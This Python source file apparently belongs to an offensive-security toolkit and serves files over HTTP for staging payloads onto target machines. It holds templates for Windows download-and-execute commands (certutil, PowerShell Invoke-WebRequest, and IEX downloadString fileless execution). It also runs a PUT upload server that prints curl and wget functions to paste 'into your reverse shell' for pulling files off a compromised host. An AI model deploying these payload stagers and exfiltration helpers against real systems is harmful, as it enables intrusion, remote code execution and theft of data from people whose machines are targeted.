#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Http Servers Module."""
import os
from http import server
import socketserver
import shutil
import tempfile
import os
import pathlib
from v0tools import ansi, exceptions
from v0tools.lib import filesystem, util
import threading

SERV_PREFIXES = {
    "none": "__URL__",
    "certutil": "certutil.exe -urlcache -split -f __URL__",
    "ps-download": "powershell Invoke-WebRequest -outfile __OUT__ -uri __URL__",
    "ps-exec": "powershell \"IEX(New-Object Net.WebClient).downloadString('__URL__')\"",
}
"""SERVER helper prefixes for windows and linux based systems."""


PS_REMOTE_DOWNLOAD_OBJ = """
(New-Object Net.WebClient).DownloadString('__URL__')
""".strip()
"""Powershell Download Template."""


class PutHTTPRequestHandler(server.SimpleHTTPRequestHandler):
    """Extend SimpleHTTPRequestHandler to handle PUT requests"""

    def do_PUT(self):
        """Save a file following a HTTP PUT request"""
        filename = os.path.basename(self.path)

        # Don't overwrite files
        if os.path.exists(filename):
            self.send_response(409, "Conflict")
            self.end_headers()
            reply_body = '"%s" already exists\n' % filename
            self.wfile.write(reply_body.encode("utf-8"))
            return

        file_length = int(self.headers["Content-Length"])
        with open(filename, "wb") as output_file:
            output_file.write(self.rfile.read(file_length))
        self.send_response(201, "Created")
        self.end_headers()
        reply_body = 'Saved "%s"\n' % filename
        self.wfile.write(reply_body.encode("utf-8"))


def serve(
    address: str,
    port: str,
    serv_path: str,
    display="none",
):
    """Server a file or directory via http."""
    display = SERV_PREFIXES[display]
    path = pathlib.Path(serv_path).resolve()
    if not path.exists():
        raise RuntimeError(f"{path} does not exist")

    try:
        if path.is_dir():
            os.chdir(path)
            http = server.HTTPServer(
                (address, int(port)), server.SimpleHTTPRequestHandler
            )
            for i in sorted(filesystem.iterfiles(str(path), "*")):
                upath = i.replace(f"{path}/", "")
                url = f"http://{address}:{port}/{upath}"
                print(display.replace("__URL__", url))
            print(ansi.banner(f"Now serving at Server http://{address}/"))
            http.serve_forever()
        elif path.is_file():
            with tempfile.TemporaryDirectory() as tmpdir:
                npath = pathlib.Path(tmpdir).resolve()
                dfile = npath.joinpath(path.name)
                shutil.copy(path, dfile)
                os.chdir(npath)
                http = server.HTTPServer(
                    (address, int(port)), server.SimpleHTTPRequestHandler
                )
                url = f"http://{address}:{port}/{path.name}"
                print(display.replace("__URL__", url))
                print(ansi.banner(f"Now serving at Server http://{address}/"))
                http.serve_forever()
        else:
            raise RuntimeError(f"Unknown filetype {path}")
    except KeyboardInterrupt:
        print("Bye!")


def uploader(
    address: str,
    port: str,
    serv_path: str,
):
    """Server PUT requests for file uploads."""
    path = pathlib.Path(serv_path).resolve()
    if not path.is_dir():
        raise exceptions.DirectoryNotExist(str(path))
    os.chdir(path)
    try:
        with socketserver.TCPServer(
            (address, int(port)), PutHTTPRequestHandler
        ) as httpd:
            url = f"http://{address}:{port}"
            upl_ex = "cput() { curl -X PUT --upload-file ${1} %s/ ; }" % url
            upl_ex2 = (
                "wput() { wget --method PUT --body-file=${1} %s/$(basename ${1}) -O- ; }"
                % url
            )
            print(ansi.banner(f"Now Serving at http://{address}"))
            print("Paste this into your reverse shell to upload files")
            print(ansi.section(f"upl ex:\n\t{upl_ex}\n\t{upl_ex2}"))
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("Bye!")


class BackgroundHttp(object):
    """Background HTTP server for staging pruposes."""

    def __init__(
        self,
        path: str,
        address: str,
        port: str,
    ):
        """Init BackgroundHttp server."""

        self.path = pathlib.Path(path).resolve()
        """Upload path."""

        self.address = address
        """http address."""

        self.port = port
        """http port."""

        self.thread = threading.Thread(target=self._run, args=())
        """Server thread."""

    @property
    def url(self):
        """URL of background server."""
        return f"http://{self.address}:{self.port}/{self.path.name}"

    def start(self):
        """Start Thread."""
        self.thread.start()

    def _run(self):
        """Run Server."""
        serve(self.address, self.port, str(self.path))


def powershell_serv(address: str, port: str, file: str):
    """
    Powershell server in a temporary thread.
    """
    path = pathlib.Path(file).resolve()
    port = str(util.randport())
    obj = BackgroundHttp(str(path), address, port)
    obj.start()
    return PS_REMOTE_DOWNLOAD_OBJ.replace("__URL__", obj.url)


def main():
    """Run main function."""
    # 10.10.14.4


if __name__ == "__main__":
    main()
